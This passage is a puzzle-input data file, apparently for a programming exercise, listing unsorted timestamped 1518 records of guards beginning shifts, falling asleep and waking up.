asleep\n[1518-06-06 00:56] wakes up\n[1518-10-10 00:00] Guard #1601 begins shift\n[1518-11-02 00:53] wakes up\n[1518-07-03 00:32] falls asleep\n[1518-10-18 23:59] Guard #1051 begins shift\n[1518-09-07 00:47] wakes up\n[1518-04-25 00:15] falls asleep\n[1518-09-04 00:40] wakes up\n[1518-05-20 00:57] wakes up\n[1518-05-26 00:43] wakes up\n[1518-10-30 00:40] falls asleep\n[1518-08-11 00:54] wakes up\n[1518-11-05 00:59] wakes up\n[1518-07-30 00:17] falls asleep\n[1518-06-09 23:56] Guard #2851 begins shift\n[1518-10-27 00:12] wakes up\n[1518-10-15 23:58] Guard #2267 begins shift\n[1518-05-26 00:51] falls asleep\n[1518-04-15 00:46] wakes up\n[1518-10-27 00:33] falls asleep\n[1518-10-25 00:58] wakes up\n[1518-04-20 00:52] wakes up\n[1518-10-28 23:58] Guard #1307 begins shift\n[1518-10-02 00:17] falls asleep\n[1518-06-25 23:52] Guard #1601 begins shift\n[1518-03-06 00:59] wakes up\n[1518-08-31 00:23] falls asleep\n[1518-09-03 00:04] Guard #1051 begins shift\n[1518-04-03 23:51] Guard #163 begins shift\n[1518-09-29 00:00] Guard #269 begins shift\n[1518-10-07 23:58] Guard #2851 begins shift\n[1518-05-23 00:57] falls asleep\n[1518-09-20 00:24] falls asleep\n[1518-03-28 00:38] wakes up\n[1518-10-26 00:07] falls asleep\n[1518-06-16 00:23] wakes up\n[1518-08-07 00:18] falls asleep\n[1518-09-22 00:00] Guard #509 begins shift\n[1518-11-09 00:00] Guard #3203 begins shift\n[1518-06-08 00:07] falls asleep\n[1518-09-04 23:58] Guard #3559 begins shift\n[1518-05-21 00:55] falls asleep\n[1518-09-21 00:45] wakes up\n[1518-08-13 23:56] Guard #163 begins shift\n[1518-07-02 00:01] Guard #1091 begins shift\n[1518-09-03 00:36] falls asleep\n[1518-05-10 00:06] falls asleep\n[1518-06-16 00:00] Guard #509 begins shift\n[1518-08-18 00:15] wakes up\n[1518-05-08 00:49] falls asleep\n[1518-07-29 00:30] wakes up\n[1518-08-23 00:32] wakes up\n[1518-06-18 00:46] wakes up\n[1518-08-10 00:12] falls asleep\n[1518-10-09 00:51] wakes up\n[1518-03-17 00:41] falls asleep\n[1518-03-17 00:38] wakes up\n[1518-06-20 00:04] Guard #3559 begins shift\n[1518-07-24 00:43] wakes up\n[1518-04-11 00:48] wakes up\n[1518-11-05 00:28] falls asleep\n[1518-04-06 00:24] falls asleep\n[1518-06-09 00:00] Guard #3203 begins shift\n[1518-06-27 00:32] falls asleep\n[1518-08-21 23:56] Guard #2267 begins shift\n[1518-06-03 00:21] falls asleep\n[1518-06-27 00:00] Guard #2617 begins shift\n[1518-05-16 00:28] wakes up\n[1518-11-21 00:44] wakes up\n[1518-03-08 00:36] wakes up\n[1518-04-03 00:00] Guard #2447 begins shift\n[1518-03-17 00:11] wakes up\n[1518-05-19 00:26] falls asleep\n[1518-04-12 00:48] falls asleep\n[1518-10-09 00:38] wakes up\n[1518-03-11 00:40] wakes up\n[1518-05-02 00:39] falls asleep\n[1518-05-28 00:58] wakes up\n[1518-09-30 00:45] falls asleep\n[1518-04-07 00:21] falls asleep\n[1518-06-23 00:22] wakes up\n[1518-04-29 23:56] Guard #349 begins shift\n[1518-03-12 00:01] Guard #1601 begins shift\n[1518-03-28 23:58] Guard #1307 begins shift\n[1518-05-21 00:08] wakes up\n[1518-05-21 00:23] falls asleep\n[1518-08-24 00:01] Guard #2333 begins shift\n[1518-09-01 23:57] Guard #1601 begins shift\n[1518-05-08 00:32] wakes up\n[1518-07-08 00:58] wakes up\n[1518-11-16 00:53] wakes up\n[1518-07-07 00:35] falls asleep\n[1518-06-26 00:22] wakes up\n[1518-09-09 00:48] falls asleep\n[1518-04-05 00:52] falls asleep\n[1518-05-30 00:57] wakes up\n[1518-08-26 00:43] wakes up\n[1518-06-25 00:03] Guard #1307 begins shift\n[1518-07-19 00:02] falls asleep\n[1518-08-01 00:01] falls asleep\n[1518-07-21 23:58] Guard #269 begins shift\n[1518-08-16 00:53] wakes up\n[1518-08-25 00:04] Guard #1307 begins shift\n[1518-06-14 00:28] falls asleep\n[1518-05-09 00:56] falls asleep\n[1518-04-18 23:57] Guard #1051 begins shift\n[1518-04-20 00:15] falls asleep\n[1518-10-10 00:20] falls asleep\n[1518-09-09 00:39] wakes up\n[1518-04-14 00:03] Guard #3203 begins shift\n[1518-03-29 00:54] wakes up\n[1518-07-26 00:49] wakes up\n[1518-11-04 00:01] Guard #2851 begins shift\n[1518-10-26 00:46] wakes up\n[1518-08-13 00:39] falls asleep\n[1518-09-22 00:41] falls asleep\n[1518-04-26 00:24] falls asleep\n[1518-06-15 00:45] falls asleep\n[1518-03-12 00:06] falls asleep\n[1518-03-30 00:00] Guard #353 begins shift\n[1518-10-17 00:33] falls asleep\n[1518-10-03 00:58] wakes up\n[1518-10-08 00:50] wakes up\n[1518-05-24 00:54] wakes up\n[1518-05-12 00:53] wakes up\n[1518-09-18 00:55] falls asleep\n[1518-03-16 00:07] falls asleep\n[1518-09-22 00:51] wakes up\n[1518-06-24 00:19] wakes up\n[1518-05-03 00:34] wakes up\n[1518-10-17 00:21] wakes up\n[1518-06-04 00:13] wakes up\n[1518-07-06 00:03] Guard #1153 begins shift\n[1518-04-11 00:54] falls asleep\n[1518-07-30 00:37] falls asleep\n[1518-07-28 00:50] wakes up\n[1518-04-24 00:00] Guard #3559 begins shift\n[1518-06-23 00:54] wakes up\n[1518-11-19 00:00] Guard #2399 begins shift\n[1518-03-04 00:35] wakes up\n[1518-07-16 00:03] Guard #1091 begins shift\n[1518-09-29 00:38] wakes up\n[1518-10-06 00:51] wakes up\n[1518-09-18 00:59] wakes up\n[1518-04-17 00:59] wakes up\n[1518-06-10 00:29] falls asleep\n[1518-05-28 00:38] wakes up\n[1518-07-20 00:12] falls asleep\n[1518-10-22 23:59] Guard #3559 begins shift\n[1518-10-17 00:13] falls asleep\n[1518-06-11 00:14] wakes up\n[1518-08-29 00:53] wakes up\n[1518-10-29 00:58] wakes up\n[1518-03-07 00:24] wakes up\n[1518-05-12 00:08] falls asleep\n[1518-10-01 00:58] wakes up\n[1518-06-12 00:00] Guard #2333 begins shift\n[1518-04-30 00:17] falls asleep\n[1518-05-14 00:02] Guard #1601 begins shift\n[1518-07-01 00:29] falls asleep\n[1518-07-04 00:03] Guard #269 begins shift\n[1518-07-13 00:56] falls asleep\n[1518-09-24 23:56] Guard #2399 begins shift\n[1518-08-20 00:11] falls asleep\n[1518-10-23 00:36] wakes up\n[1518-09-07 00:59] wakes up\n[1518-05-01 00:30] wakes up\n[1518-11-20 00:46] falls asleep\n[1518-10-14 00:15] falls asleep\n[1518-03-08 23:50] Guard #1051 begins shift\n[1518-07-24 00:52] wakes up\n[1518-08-15 00:55] wakes up\n[1518-03-28 00:17] falls asleep\n[1518-05-10 00:00] Guard #2153 begins shift\n[1518-06-18 00:32] falls asleep\n[1518-05-03 00:47] falls asleep\n[1518-05-05 00:10] falls asleep\n[1518-09-08 00:35] falls asleep\n[1518-08-18 00:54] falls asleep\n[1518-03-10 00:32] wakes up\n[1518-03-12 00:53] falls asleep\n[1518-03-08 00:20] wakes up\n[1518-05-31 00:56] wakes up\n[1518-03-05 00:03] Guard #691 begins shift\n[1518-04-23 00:47] falls asleep\n[1518-04-11 00:57] wakes up\n[1518-10-04 23:56] Guard #2447 begins shift\n[1518-10-11 00:28] falls asleep\n[1518-03-21 00:28] wakes up\n[1518-04-15 00:35] falls asleep\n[1518-08-16 00:38] wakes up\n[1518-08-09 23:56] Guard #1307 begins shift\n[1518-07-13 00:24] falls asleep\n[1518-08-31 23:58] Guard #2447 begins shift\n[1518-08-04 00:00] Guard #1153 begins shift\n[1518-06-13 00:16] falls asleep\n[1518-10-10 00:57] wakes up\n[1518-05-29 00:00] Guard #1051 begins shift\n[1518-07-13 00:44] falls asleep\n[1518-09-14 00:07] falls asleep\n[1518-08-05 00:51] falls asleep\n[1518-07-11 00:58] wakes up\n[1518-10-22 00:43] wakes up\n[1518-04-14 00:59] wakes up\n[1518-06-03 23:50] Guard #2399 begins shift\n[1518-10-22 00:49] falls asleep\n[1518-09-10 00:52] wakes up\n[1518-05-04 00:46] wakes up\n[1518-08-27 00:34] falls asleep\n[1518-05-15 00:31] wakes up\n[1518-09-30 00:55] wakes up\n[1518-08-08 00:49] falls asleep\n[1518-11-17 00:20] falls asleep\n[1518-07-01 00:46] wakes up\n[1518-03-05 00:25] falls asleep\n[1518-11-12 00:03] Guard #353 begins shift\n[1518-09-20 23:59] Guard #2153 begins shift\n[1518-06-21 00:57] wakes up\n[1518-11-22 00:14] falls asleep\n[1518-03-23 00:35] wakes up\n[1518-05-04 00:45] falls asleep\n[1518-07-17 00:44] wakes up\n[1518-09-05 23:52] Guard #1601 begins shift\n[1518-10-04 00:01] Guard #163 begins shift\n[1518-08-17 00:42] wakes up\n[1518-09-12 00:04] Guard #349 begins shift\n[1518-11-20 23:59] Guard #2617 begins shift\n[1518-09-17 00:58] wakes up\n[1518-11-14 00:20] falls asleep\n[1518-09-08 00:29] falls asleep\n[1518-05-18 00:55] wakes up\n[1518-03-31 00:07] falls asleep\n[1518-04-14 00:51] falls asleep\n[1518-11-06 00:59] wakes up\n[1518-03-25 00:31] wakes up\n[1518-05-07 00:01] Guard #163 begins shift\n[1518-11-03 00:52] wakes up\n[1518-05-22 00:33] falls asleep\n[1518-06-18 00:25] wakes up\n[1518-08-02 00:02] falls asleep\n[1518-03-17 00:01] Guard #2267 begins shift\n[1518-03-06 00:53] falls asleep\n[1518-09-22 00:17] falls asleep\n[1518-07-23 23:59] Guard #1307 begins shift\n[1518-08-15 00:18] wakes up\n[1518-08-16 00:13] falls asleep\n[1518-08-17 00:48] falls asleep\n[1518-11-20 00:34] falls asleep\n[1518-05-01 00:03] Guard #1091 begins shift\n[1518-06-13 00:24] wakes up\n[1518-09-03 00:32] wakes up\n[1518-09-06 00:53] wakes up\n[1518-04-20 23:47] Guard #1601 begins shift\n[1518-06-13 23:59] Guard #2267 begins shift\n[1518-03-18 00:04] Guard #2447 begins shift\n[1518-06-22 00:53] wakes up\n[1518-09-09 00:33] wakes up\n[1518-11-02 00:29] falls asleep\n[1518-07-27 00:02] Guard #509 begins shift\n[1518-06-28 00:50] wakes up\n[1518-06-05 00:02] Guard #2333 begins shift\n[1518-05-22 00:23] wakes up\n[1518-10-28 00:01] Guard #2399 begins shift\n[1518-04-03 00:21] wakes up\n[1518-10-31 00:33] falls asleep\n[1518-11-11 00:39] falls asleep\n[1518-04-29 00:00] Guard #1601 begins shift\n[1518-06-01 00:41] falls asleep\n[1518-05-10 00:50] falls asleep\n[1518-08-01 00:43] wakes up\n[1518-11-13 00:25] wakes up\n[1518-08-15 00:39] falls asleep\n[1518-03-09 00:03] falls asleep\n[1518-06-14 23:46] Guard #353 begins shift\n[1518-06-20 00:23] falls asleep\n[1518-10-09 00:41] falls asleep\n[1518-09-18 00:10] falls asleep\n[1518-04-20 00:00] Guard #2447 begins shift\n[1518-05-27 00:15] wakes up\n[1518-04-06 00:58] wakes up\n[1518-07-17 00:13] falls asleep\n[1518-10-20 00:21] falls asleep\n[1518-04-14 23:58] Guard #2851 begins shift\n[1518-03-14 00:03] Guard #2851 begins shift\n[1518-03-07 00:47] wakes up\n[1518-09-22 00:38] wakes up\n[1518-05-03 00:02] Guard #2153 begins shift\n[1518-05-14 00:59] wakes up\n[1518-09-09 00:49] wakes up\n[1518-03-25 00:26] falls asleep\n[1518-10-19 00:49] wakes up\n[1518-05-26 00:53] wakes up\n[1518-05-21 00:49] wakes up\n[1518-06-06 00:44] falls asleep\n[1518-07-01 00:00] Guard #353 begins shift\n[1518-03-31 00:30] wakes up\n[1518-06-21 00:50] wakes up\n[1518-08-22 00:59] wakes up\n[1518-06-30 00:32] falls asleep\n[1518-05-13 00:51] wakes up\n[1518-07-07 00:53] wakes up\n[1518-11-06 00:45] falls asleep\n[1518-08-19 23:56] Guard #2267 begins shift\n[1518-04-23 00:37] falls asleep\n[1518-08-01 00:54] falls asleep\n[1518-05-14 23:59] Guard #1117 begins shift\n[1518-09-11 00:58] wakes up\n[1518-03-18 00:13] falls asleep\n[1518-08-03 00:23] wakes up\n[1518-03-18 00:57] falls asleep\n[1518-07-30 00:34] wakes up\n[1518-07-09 23:50] Guard #353 begins shift\n[1518-06-21 00:01] Guard #2399 begins shift\n[1518-10-04 00:43] wakes up\n[1518-06-25 00:40] falls asleep\n[1518-04-08 00:18] falls asleep\n[1518-10-16 00:25] falls asleep\n[1518-07-19 00:56] wakes up\n[1518-06-06 00:37] wakes up\n[1518-03-18 00:39] wakes up\n[1518-07-30 00:27] wakes up\n[1518-10-07 00:24] falls asleep\n[1518-04-06 00:56] falls asleep\n[1518-08-07 00:00] Guard #3203 begins shift\n[1518-05-02 00:00] falls asleep\n[1518-05-03 00:49] wakes up\n[1518-08-09 00:39] wakes up\n[1518-09-26 00:15] falls asleep\n[1518-09-12 00:41] wakes up\n[1518-11-04 00:57] wakes up\n[1518-09-16 00:03] Guard #2153 begins shift\n[1518-07-06 23:57] Guard #691 begins shift\n[1518-10-28 00:50] wakes up\n[1518-04-08 00:49] wakes up\n[1518-09-15 00:58] wakes up\n[1518-05-10 00:55] wakes up\n[1518-11-23 00:50] wakes up\n[1518-04-21 00:11] wakes up\n[1518-03-18 23:57] Guard #1307 begins shift\n[1518-09-18 00:29] wakes up\n[1518-09-15 00:43] falls asleep\n[1518-09-03 00:22] falls asleep\n[1518-09-25 00:57] wakes up\n[1518-10-02 00:53] wakes up\n[1518-07-26 00:39] falls asleep\n[1518-08-14 00:47] wakes up\n[1518-06-09 00:12] falls asleep\n[1518-09-09 00:02] Guard #163 begins shift\n[1518-10-22 00:24] falls asleep\n[1518-03-19 23:59] Guard #1153 begins shift\n[1518-11-06 23:58] Guard #1117 begins shift\n[1518-11-01 00:02] Guard #1051 begins shift\n[1518-08-10 23:59] Guard #509 begins shift\n[1518-07-07 00:38] wakes up\n[1518-08-18 23:59] Guard #2333 begins shift\n[1518-06-17 00:47] wakes up\n[1518-11-18 00:40] wakes up\n[1518-07-10 00:01] falls asleep\n[1518-03-13 00:15] falls asleep\n[1518-10-16 23:56] Guard #691 begins shift\n[1518-10-15 00:17] falls asleep\n[1518-04-18 00:16] falls asleep\n[1518-03-12 00:16] wakes up\n[1518-03-22 00:56] wakes up\n[1518-03-09 00:55] wakes up\n[1518-03-30 23:58] Guard #2447 begins shift\n[1518-04-04 00:01] falls asleep\n[1518-03-17 00:09] falls asleep\n[1518-06-22 00:00] Guard #1051 begins shift\n[1518-09-28 00:55] wakes up\n[1518-04-28 00:45] falls asleep\n[1518-04-17 00:54] wakes up\n[1518-07-22 00:58] wakes up\n[1518-03-04 00:08] falls asleep\n[1518-07-22 00:45] falls asleep\n[1518-06-16 23:58] Guard #163 begins shift\n[1518-05-19 23:58] Guard #2851 begins shift\n[1518-07-14 00:57] wakes up\n[1518-08-01 00:58] wakes up\n[1518-08-25 00:56] falls asleep\n[1518-07-25 00:50] wakes up\n[1518-06-28 00:36] falls asleep\n[1518-05-18 00:02] Guard #2399 begins shift\n[1518-03-21 00:16] falls asleep\n[1518-04-25 23:59] Guard #3203 begins shift\n[1518-05-12 00:21] wakes up\n[1518-11-05 00:50] falls asleep\n[1518-04-17 00:57] falls asleep\n[1518-11-17 00:01] Guard #163 begins shift\n[1518-04-28 00:00] Guard #269 begins shift\n[1518-03-05 00:47] falls asleep\n[1518-05-05 00:28] wakes up\n[1518-06-20 00:58] wakes up\n[1518-08-28 23:56] Guard #2617 begins shift\n[1518-06-01 00:56] wakes up\n[1518-04-08 23:57] Guard #269 begins shift\n[1518-10-03 00:03] Guard #509 begins shift\n[1518-06-02 00:04] Guard #1307 begins shift\n[1518-04-11 00:00] Guard #2333 begins shift\n[1518-06-23 00:51] falls asleep\n[1518-04-10 00:30] falls asleep\n[1518-08-04 23:53] Guard #2153 begins shift\n[1518-06-10 23:53] Guard #2153 begins shift\n[1518-03-15 00:51] falls asleep\n[1518-10-26 23:51] Guard #353 begins shift\n[1518-05-19 00:48] falls asleep\n[1518-08-23 00:31] falls asleep\n[1518-10-21 00:58] wakes up\n[1518-05-17 00:39] wakes up\n[1518-11-22 00:44] wakes up\n[1518-10-18 00:09] falls asleep\n[1518-09-19 00:00] Guard #1061 begins shift\n[1518-09-06 00:37] falls asleep\n[1518-10-18 00:56] wakes up\n[1518-11-19 00:43] falls asleep\n[1518-05-21 23:58] Guard #2153 begins shift\n[1518-11-18 00:31] wakes up\n[1518-04-19 00:08] falls asleep\n[1518-07-23 00:14] falls asleep\n[1518-06-08 00:56] wakes up\n[1518-04-13 00:56] wakes up\n[1518-06-17 00:40] falls asleep\n[1518-03-07 00:15] falls asleep\n[1518-03-15 00:02] falls asleep\n[1518-03-13 00:00] Guard #2153 begins shift\n[1518-05-27 00:00] Guard #269 begins shift\n[1518-03-16 00:58] wakes up\n[1518-04-16 00:39] wakes up\n[1518-11-07 23:50] Guard #2399 begins shift\n[1518-07-21 00:01] Guard #3559 begins shift\n[1518-07-17 00:57] falls asleep\n[1518-06-12 00:52] falls asleep\n[1518-11-05 00:22] wakes up\n[1518-03-15 00:57] wakes up\n[1518-09-26 00:00] Guard #2399 begins shift\n[1518-07-21 00:38] falls asleep\n[1518-08-11 00:29] falls asleep\n[1518-07-29 23:57] Guard #1051 begins shift\n[1518-04-13 00:44] falls asleep\n[1518-05-28 00:04] Guard #691 begins shift\n[1518-05-20 00:39] falls asleep\n[1518-06-10 00:57] falls asleep\n[1518-05-07 00:54] wakes up\n[1518-03-24 00:21] falls asleep\n[1518-10-31 00:00] Guard #2267 begins shift\n[1518-08-28 00:38] wakes up\n[1518-10-29 00:53] falls asleep\n[1518-04-21 00:01] falls asleep\n[1518-09-12 00:06] falls asleep\n[1518-05-31 00:38] falls asleep\n[1518-06-11 00:48] wakes up\n[1518-06-11 00:03] falls asleep\n[1518-05-02 00:35] wakes up\n[1518-10-05 00:57] wakes up\n[1518-07-20 00:50] wakes up\n[1518-10-31 00:52] wakes up\n[1518-09-09 00:28] falls asleep\n[1518-10-27 00:36] wakes up\n[1518-11-06 00:02] Guard #3559 begins shift\n[1518-08-31 00:00] Guard #1091 begins shift\n[1518-05-29 00:57] wakes up\n[1518-09-06 00:28] wakes up\n[1518-07-24 23:58] Guard #269 begins shift\n[1518-06-04 00:43] falls asleep\n[1518-09-19 23:56] Guard #2399 begins shift\n[1518-08-03 00:41] wakes up\n[1518-07-15 00:09] falls asleep\n[1518-03-04 00:59] wakes up\n[1518-04-02 00:12] falls asleep\n[1518-08-21 00:55] wakes up\n[1518-07-29 00:40] falls asleep\n[1518-05-05 00:07] wakes up\n[1518-04-14 00:15] falls asleep\n[1518-08-08 00:00] Guard #3559 begins shift\n[1518-03-11 00:00] falls asleep\n[1518-06-09 00:18] wakes up\n[1518-09-07 00:46] falls asleep\n[1518-09-01 00:56] falls asleep\n[1518-07-27 23:58] Guard #163 begins shift\n[1518-08-18 00:41] falls asleep\n[1518-08-23 00:49] wakes up\n[1518-06-02 23:57] Guard #2447 begins shift\n[1518-11-02 23:54] Guard #509 begins shift\n[1518-04-13 00:08] falls asleep\n[1518-06-09 00:47] falls asleep\n[1518-04-16 00:07] falls asleep\n[1518-07-18 00:43] falls asleep\n[1518-07-31 00:48] falls asleep\n[1518-10-20 00:49] falls asleep\n[1518-11-23 00:37] wakes up\n[1518-07-19 00:21] wakes up\n[1518-05-11 00:51] wakes up\n[1518-06-12 00:53] wakes up\n[1518-04-02 00:33] wakes up\n[1518-06-10 00:58] wakes up\n[1518-10-20 00:03] Guard #2399 begins shift\n[1518-04-25 00:03] Guard #269 begins shift\n[1518-04-12 00:20] wakes up\n[1518-08-14 00:09] falls asleep\n[1518-06-15 00:56] wakes up\n[1518-11-05 00:43] wakes up\n[1518-03-21 00:03] Guard #2333 begins shift\n[1518-05-18 00:17] falls asleep\n[1518-07-07 00:47] falls asleep\n[1518-07-11 00:53] falls asleep\n[1518-08-16 00:51] falls asleep\n[1518-07-22 00:07] falls asleep\n[1518-04-11 23:58] Guard #509 begins shift\n[1518-10-18 00:01] Guard #2333 begins shift\n[1518-07-31 00:00] Guard #2153 begins shift\n[1518-09-05 00:50] wakes up\n[1518-05-23 00:58] wakes up\n[1518-11-12 00:56] wakes up\n[1518-06-23 23:47] Guard #2447 begins shift\n[1518-11-04 00:30] wakes up\n[1518-07-26 00:04] Guard #691 begins shift\n[1518-09-15 00:00] Guard #163 begins shift\n[1518-05-25 00:32] wakes up\n[1518-09-16 00:55] falls asleep\n[1518-05-26 00:41] falls asleep\n[1518-03-22 00:24] falls asleep\n[1518-11-14 23:58] Guard #1601 begins shift\n[1518-05-21 00:57] wakes up\n[1518-05-22 00:22] falls asleep\n[1518-03-23 00:14] falls asleep\n[1518-04-04 23:59] Guard #2399 begins shift\n[1518-07-16 00:52] wakes up\n[1518-11-22 00:43] falls asleep\n[1518-10-28 00:39] falls asleep\n[1518-05-23 00:53] wakes up\n[1518-09-27 00:19] falls asleep\n[1518-04-23 00:10] falls asleep\n[1518-06-07 23:56] Guard #3559 begins shift\n[1518-11-06 00:22] falls asleep\n[1518-08-17 00:39] falls asleep\n[1518-06-09 00:22] falls asleep\n[1518-11-20 00:58] wakes up\n[1518-03-07 00:00] Guard #2399 begins shift\n[1518-10-25 23:59] Guard #1051 begins shift\n[1518-07-25 00:27] falls asleep\n[1518-06-16 00:15] falls asleep\n[1518-07-31 00:58] wakes up\n[1518-09-10 00:29] falls asleep\n[1518-11-04 00:33] falls asleep\n[1518-07-02 00:46] falls asleep\n[1518-09-07 00:00] Guard #2617 begins shift\n[1518-05-16 00:05] falls asleep\n[1518-10-30 00:00] Guard #3203 begins shift\n[1518-06-30 00:53] wakes up\n[1518-05-31 00:43] wakes up\n[1518-05-26 00:35] wakes up\n[1518-08-24 00:13] falls asleep\n[1518-11-17 00:52] wakes up\n[1518-09-28 00:02] Guard #3559 begins shift\n[1518-08-02 00:43] wakes up\n[1518-08-02 00:56] wakes up\n[1518-06-14 00:57] wakes up\n[1518-06-13 00:47] falls asleep\n[1518-03-08 00:54] wakes up\n[1518-09-14 00:48] wakes up\n[1518-10-05 00:06] falls asleep\n[1518-05-08 00:02] Guard #163 begins shift\n[1518-07-27 00:18] wakes up\n[1518-09-07 00:57] falls asleep\n[1518-11-18 00:39] falls asleep\n[1518-09-03 00:43] wakes up\n[1518-05-13 00:17] falls asleep\n[1518-08-05 00:57] falls asleep\n[1518-05-11 23:56] Guard #1601 begins shift\n[1518-11-17 00:39] wakes up\n[1518-11-21 00:38] falls asleep\n[1518-07-18 23:54] Guard #353 begins shift\n[1518-08-11 23:59] Guard #2617 begins shift\n[1518-05-20 00:12] falls asleep\n[1518-08-31 00:57] wakes up\n[1518-04-05 00:57] wakes up\n[1518-05-31 00:54] falls asleep\n[1518-11-15 00:24] falls asleep\n[1518-05-03 23:58] Guard #1117 begins shift\n[1518-07-24 00:41] falls asleep\n[1518-07-26 00:54] falls asleep\n[1518-08-22 23:57] Guard #353 begins shift\n[1518-07-29 00:00] falls asleep\n[1518-04-15 00:29] wakes up\n[1518-03-19 00:45] falls asleep\n[1518-05-31 00:26] falls asleep\n[1518-08-19 00:16] falls asleep\n[1518-10-24 00:01] Guard #349 begins shift\n[1518-07-22 23:56] Guard #1601 begins shift\n[1518-06-03 00:35] wakes up\n[1518-04-23 00:38] wakes up\n[1518-11-14 00:50] wakes up\n[1518-04-08 00:42] falls asleep\n[1518-10-29 00:46] wakes up\n[1518-10-20 00:51] wakes up\n[1518-03-18 00:59] wakes up\n[1518-03-19 00:55] wakes up\n[1518-04-11 00:33] falls asleep\n[1518-05-07 00:22] falls asleep\n[1518-08-28 00:00] Guard #2399 begins shift\n[1518-04-11 00:34] wakes up\n[1518-04-24 00:48] wakes up\n[1518-03-18 00:28] wakes up\n[1518-09-12 00:34] falls asleep\n[1518-09-15 00:34] wakes up\n[1518-08-18 00:03] Guard #353 begins shift\n[1518-03-13 00:45] wakes up\n[1518-05-20 23:57] Guard #1601 begins shift\n[1518-09-01 00:29] wakes up\n[1518-03-09 23:56] Guard #2267 begins shift\n[1518-11-21 23:58] Guard #509 begins shift\n[1518-04-27 00:03] Guard #2267 begins shift\n[1518-05-10 00:38] wakes up\n[1518-09-17 00:19] wakes up\n[1518-09-30 23:53] Guard #1091 begins shift\n[1518-10-16 00:50] wakes up\n[1518-06-21 00:30] falls asleep\n[1518-10-20 00:28] wakes up\n[1518-05-23 23:46] Guard #691 begins shift\n[1518-08-28 00:53] wakes up\n[1518-10-11 23:57] Guard #2851 begins shift\n[1518-09-23 00:43] wakes up\n[1518-06-26 00:57] wakes up\n[1518-08-03 00:51] wakes up\n[1518-08-30 00:44] falls asleep\n[1518-10-17 00:46] wakes up\n[1518-06-01 00:34] wakes up\n[1518-05-16 00:32] falls asleep\n[1518-08-03 00:21] falls asleep\n[1518-05-15 00:45] falls asleep\n[1518-06-11 00:34] falls asleep\n[1518-11-10 00:58] wakes up\n[1518-07-12 00:02] Guard #1061 begins shift\n[1518-03-28 00:01] Guard #163 begins shift\n[1518-06-17 00:30] wakes up\n[1518-08-12 00:06] falls asleep\n[1518-06-16 00:57] wakes up\n[1518-08-03 00:00] Guard #2399 begins shift\n[1518-05-25 23:59] Guard #1307 begins shift\n[1518-03-25 23:50] Guard #163 begins shift\n[1518-09-06 00:03] falls asleep\n[1518-04-22 23:58] Guard #2153 begins shift\n[1518-03-23 23:57] Guard #1091 begins shift\n[1518-03-22 00:42] falls asleep\n[1518-08-08 23:56] Guard #1601 begins shift\n[1518-06-18 00:00] Guard #2267 begins shift\n[1518-06-18 00:15] falls asleep\n[1518-05-20 00:32] wakes up\n[1518-05-04 23:50] Guard #163 begins shift\n[1518-08-09 00:55] wakes up\n[1518-04-06 23:58] Guard #2399 begins shift\n[1518-04-01 00:05] falls asleep\n[1518-08-05 00:54] wakes up\n[1518-07-13 23:51] Guard #2447 begins shift\n[1518-10-19 00:26] falls asleep\n[1518-07-15 00:35] wakes up\n[1518-07-28 23:51] Guard #1117 begins shift\n[1518-05-24 23:56] Guard #163 begins shift\n[1518-05-28 00:17] falls asleep\n[1518-06-21 00:56] falls asleep\n[1518-04-01 00:41] wakes up\n[1518-03-14 23:50] Guard #1307 begins shift\n[1518-11-23 00:04] Guard #3559 begins shift\n[1518-08-29 00:11] falls asleep\n[1518-07-25 00:57] wakes up\n[1518-03-08 00:35] falls asleep\n[1518-11-13 23:58] Guard #2851 begins shift\n[1518-06-15 00:04] falls asleep\n[1518-06-14 00:47] wakes up\n[1518-07-04 00:37] falls asleep\n[1518-10-13 00:02] Guard #3203 begins shift\n[1518-09-05 00:40] falls asleep\n[1518-11-23 00:31] falls asleep\n[1518-09-23 00:00] Guard #2153 begins shift\n[1518-03-17 00:31] falls asleep\n[1518-11-01 00:43] wakes up\n[1518-03-08 00:02] Guard #2851 begins shift\n[1518-11-09 23:59] Guard #3559 begins shift\n[1518-05-24 00:27] falls asleep\n[1518-07-17 00:59] wakes up\n[1518-08-03 00:47] falls asleep\n[1518-11-17 00:29] falls asleep\n[1518-07-13 00:35] wakes up\n[1518-09-11 00:25] falls asleep\n[1518-09-13 00:42] wakes up\n[1518-07-19 00:31] falls asleep\n[1518-08-23 00:16] falls asleep\n[1518-03-09 00:37] falls asleep\n[1518-04-12 23:57] Guard #1091 begins shift\n[1518-04-23 00:59] wakes up\n[1518-03-05 00:55] wakes up\n[1518-04-03 00:58] wakes up\n[1518-07-24 00:48] falls asleep\n[1518-11-08 00:41] wakes up\n[1518-05-11 00:02] Guard #353 begins shift\n[1518-05-21 00:06] falls asleep\n[1518-08-22 00:57] falls asleep\n[1518-05-05 23:58] Guard #3203 begins shift\n[1518-08-14 23:47] Guard #3203 begins shift\n[1518-05-06 00:27] wakes up\n[1518-06-17 00:25] falls asleep\n[1518-04-27 00:14] falls asleep\n[1518-04-07 00:48] wakes up\n[1518-08-25 23:56] Guard #1091 begins shift\n[1518-07-20 00:42] falls asleep\n[1518-06-28 00:00] Guard #353 begins shift\n[1518-07-05 00:51] falls asleep\n[1518-03-05 23:59] Guard #1307 begins shift\n[1518-10-21 00:38] wakes up\n[1518-09-01 00:57] wakes up\n[1518-05-09 00:00] Guard #1051 begins shift\n[1518-07-23 00:40] wakes up\n[1518-08-12 00:55] wakes up\n[1518-03-27 00:59] wakes up\n[1518-07-20 00:37] wakes up\n[1518-08-18 00:14] falls asleep\n[1518-04-03 00:07] falls asleep\n[1518-09-29 23:59] Guard #1601 begins shift\n[1518-04-04 00:51] wakes up\n[1518-11-13 00:56] wakes up\n[1518-11-12 00:10] falls asleep\n[1518-07-31 00:40] wakes up\n[1518-10-25 00:17] falls asleep\n[1518-08-06 00:55] wakes up\n[1518-05-06 00:08] falls asleep\n[1518-09-17 00:52] falls asleep\n[1518-03-05 00:30] wakes up\n[1518-10-24 00:15] falls asleep\n[1518-06-05 00:06] falls asleep\n[1518-09-01 00:17] falls asleep\n[1518-03-10 23:51] Guard #349 begins shift\n[1518-05-15 23:47] Guard #3203 begins shift\n[1518-11-15 23:59] Guard #691 begins shift\n[1518-10-29 00:34] falls asleep\n[1518-04-25 00:55] wakes up\n[1518-08-23 00:19] wakes up\n[1518-08-30 00:04] Guard #2617 begins shift\n[1518-09-12 23:57] Guard #1051 begins shift\n[1518-07-09 00:36] falls asleep\n[1518-05-17 00:04] Guard #1601 begins shift\n[1518-09-15 00:53] wakes up\n[1518-03-17 00:27] falls asleep\n[1518-06-09 00:42] wakes up\n[1518-07-15 00:04] Guard #269 begins shift\n[1518-05-08 00:27] falls 